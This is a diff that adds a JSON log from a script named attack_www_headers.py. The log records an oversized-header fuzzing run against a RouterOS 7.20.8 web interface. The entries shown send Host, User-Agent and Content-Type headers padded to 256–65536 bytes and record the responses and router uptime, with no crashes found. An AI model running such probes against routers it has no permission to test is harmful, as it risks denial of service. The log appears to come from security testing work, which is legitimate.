@@ -1,0 +1,2725 @@
+{
+  "metadata": {
+    "script": "attack_www_headers.py",
+    "target": "[REDACTED-INTERNAL-IP]",
+    "phase": "www_header_overflow",
+    "start_time": "2026-02-16T14:03:38.739779",
+    "end_time": "2026-02-16T14:06:41.494842",
+    "total_tests": 150,
+    "anomalies": 0,
+    "crashes_detected": 0,
+    "router_version": "7.20.8 (long-term)",
+    "initial_uptime": "2h4m16s",
+    "final_health": {
+      "alive": true,
+      "uptime": "2h7m19s",
+      "cpu_load": "0",
+      "free_memory": "850059264",
+      "version": "7.20.8 (long-term)"
+    }
+  },
+  "tests": [
+    {
+      "id": 1,
+      "category": "oversized_headers",
+      "name": "Host 256B",
+      "description": "Send Host header with 256-byte value",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:03:39.071613",
+      "details": {
+        "payload_size": 319,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nHost: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nCo... [truncated, total 319 chars]",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:43:34 GMT\r\nExpires: Tue, 16 Feb 2027 21:43:34 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h4m16s",
+        "uptime_after": "2h4m17s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 2,
+      "category": "oversized_headers",
+      "name": "Host 512B",
+      "description": "Send Host header with 512-byte value",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:03:39.907195",
+      "details": {
+        "payload_size": 575,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nHost: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 575 chars]",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:43:35 GMT\r\nExpires: Tue, 16 Feb 2027 21:43:35 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h4m17s",
+        "uptime_after": "2h4m17s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 3,
+      "category": "oversized_headers",
+      "name": "Host 1024B",
+      "description": "Send Host header with 1024-byte value",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:03:40.730783",
+      "details": {
+        "payload_size": 1087,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nHost: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 1087 chars]",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:43:36 GMT\r\nExpires: Tue, 16 Feb 2027 21:43:36 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h4m18s",
+        "uptime_after": "2h4m18s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 4,
+      "category": "oversized_headers",
+      "name": "Host 2048B",
+      "description": "Send Host header with 2048-byte value",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:03:41.550373",
+      "details": {
+        "payload_size": 2111,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nHost: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 2111 chars]",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:43:36 GMT\r\nExpires: Tue, 16 Feb 2027 21:43:36 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h4m19s",
+        "uptime_after": "2h4m19s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 5,
+      "category": "oversized_headers",
+      "name": "Host 4096B",
+      "description": "Send Host header with 4096-byte value",
+      "result": "Response: HTTP/1.0 400 Bad Request (639 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:03:42.365965",
+      "details": {
+        "payload_size": 4159,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nHost: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 4159 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: Keep-Alive\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:43:37 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\nHTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:43:37 GMT\r\nExpires: 0\r\nPragma: no-ca... [truncated, total 639 chars]",
+        "error": null,
+        "uptime_before": "2h4m20s",
+        "uptime_after": "2h4m20s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 6,
+      "category": "oversized_headers",
+      "name": "Host 8192B",
+      "description": "Send Host header with 8192-byte value",
+      "result": "Response: HTTP/1.0 400 Bad Request (639 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:03:43.181557",
+      "details": {
+        "payload_size": 8255,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nHost: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 8255 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: Keep-Alive\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:43:38 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\nHTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:43:38 GMT\r\nExpires: 0\r\nPragma: no-ca... [truncated, total 639 chars]",
+        "error": null,
+        "uptime_before": "2h4m20s",
+        "uptime_after": "2h4m21s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 7,
+      "category": "oversized_headers",
+      "name": "Host 16384B",
+      "description": "Send Host header with 16384-byte value",
+      "result": "Response: HTTP/1.0 400 Bad Request (322 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:03:43.989153",
+      "details": {
+        "payload_size": 16447,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nHost: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 16447 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: Keep-Alive\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:43:39 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\n",
+        "error": null,
+        "uptime_before": "2h4m21s",
+        "uptime_after": "2h4m21s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 8,
+      "category": "oversized_headers",
+      "name": "Host 65536B",
+      "description": "Send Host header with 65536-byte value",
+      "result": "Response: HTTP/1.0 400 Bad Request (322 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:03:44.812741",
+      "details": {
+        "payload_size": 65599,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nHost: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 65599 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: Keep-Alive\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:43:40 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\n",
+        "error": null,
+        "uptime_before": "2h4m22s",
+        "uptime_after": "2h4m22s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 9,
+      "category": "oversized_headers",
+      "name": "User-Agent 256B",
+      "description": "Send User-Agent header with 256-byte value",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:03:45.628333",
+      "details": {
+        "payload_size": 325,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nUser-Agent: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 325 chars]",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:43:40 GMT\r\nExpires: Tue, 16 Feb 2027 21:43:40 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h4m23s",
+        "uptime_after": "2h4m23s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 10,
+      "category": "oversized_headers",
+      "name": "User-Agent 512B",
+      "description": "Send User-Agent header with 512-byte value",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:03:46.447923",
+      "details": {
+        "payload_size": 581,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nUser-Agent: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 581 chars]",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:43:41 GMT\r\nExpires: Tue, 16 Feb 2027 21:43:41 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h4m24s",
+        "uptime_after": "2h4m24s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 11,
+      "category": "oversized_headers",
+      "name": "User-Agent 1024B",
+      "description": "Send User-Agent header with 1024-byte value",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:03:47.255519",
+      "details": {
+        "payload_size": 1093,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nUser-Agent: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 1093 chars]",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:43:42 GMT\r\nExpires: Tue, 16 Feb 2027 21:43:42 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h4m24s",
+        "uptime_after": "2h4m25s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 12,
+      "category": "oversized_headers",
+      "name": "User-Agent 2048B",
+      "description": "Send User-Agent header with 2048-byte value",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:03:48.091101",
+      "details": {
+        "payload_size": 2117,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nUser-Agent: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 2117 chars]",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:43:43 GMT\r\nExpires: Tue, 16 Feb 2027 21:43:43 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h4m25s",
+        "uptime_after": "2h4m26s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 13,
+      "category": "oversized_headers",
+      "name": "User-Agent 4096B",
+      "description": "Send User-Agent header with 4096-byte value",
+      "result": "Response: HTTP/1.0 400 Bad Request (639 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:03:48.910691",
+      "details": {
+        "payload_size": 4165,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nUser-Agent: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 4165 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: Keep-Alive\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:43:44 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\nHTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:43:44 GMT\r\nExpires: 0\r\nPragma: no-ca... [truncated, total 639 chars]",
+        "error": null,
+        "uptime_before": "2h4m26s",
+        "uptime_after": "2h4m26s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 14,
+      "category": "oversized_headers",
+      "name": "User-Agent 8192B",
+      "description": "Send User-Agent header with 8192-byte value",
+      "result": "Response: HTTP/1.0 400 Bad Request (639 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:03:49.726283",
+      "details": {
+        "payload_size": 8261,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nUser-Agent: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 8261 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: Keep-Alive\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:43:45 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\nHTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:43:45 GMT\r\nExpires: 0\r\nPragma: no-ca... [truncated, total 639 chars]",
+        "error": null,
+        "uptime_before": "2h4m27s",
+        "uptime_after": "2h4m27s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 15,
+      "category": "oversized_headers",
+      "name": "User-Agent 16384B",
+      "description": "Send User-Agent header with 16384-byte value",
+      "result": "Response: HTTP/1.0 400 Bad Request (322 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:03:50.549871",
+      "details": {
+        "payload_size": 16453,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nUser-Agent: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 16453 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: Keep-Alive\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:43:45 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\n",
+        "error": null,
+        "uptime_before": "2h4m28s",
+        "uptime_after": "2h4m28s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 16,
+      "category": "oversized_headers",
+      "name": "User-Agent 65536B",
+      "description": "Send User-Agent header with 65536-byte value",
+      "result": "Response: HTTP/1.0 400 Bad Request (639 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:03:51.373459",
+      "details": {
+        "payload_size": 65605,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nUser-Agent: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 65605 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: Keep-Alive\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:43:46 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\nHTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:43:46 GMT\r\nExpires: 0\r\nPragma: no-ca... [truncated, total 639 chars]",
+        "error": null,
+        "uptime_before": "2h4m29s",
+        "uptime_after": "2h4m29s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 17,
+      "category": "oversized_headers",
+      "name": "Content-Type 256B",
+      "description": "Send Content-Type header with 256-byte value",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:03:52.193049",
+      "details": {
+        "payload_size": 327,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nContent-Type: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 327 chars]",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:43:47 GMT\r\nExpires: Tue, 16 Feb 2027 21:43:47 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h4m29s",
+        "uptime_after": "2h4m30s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 18,
+      "category": "oversized_headers",
+      "name": "Content-Type 512B",
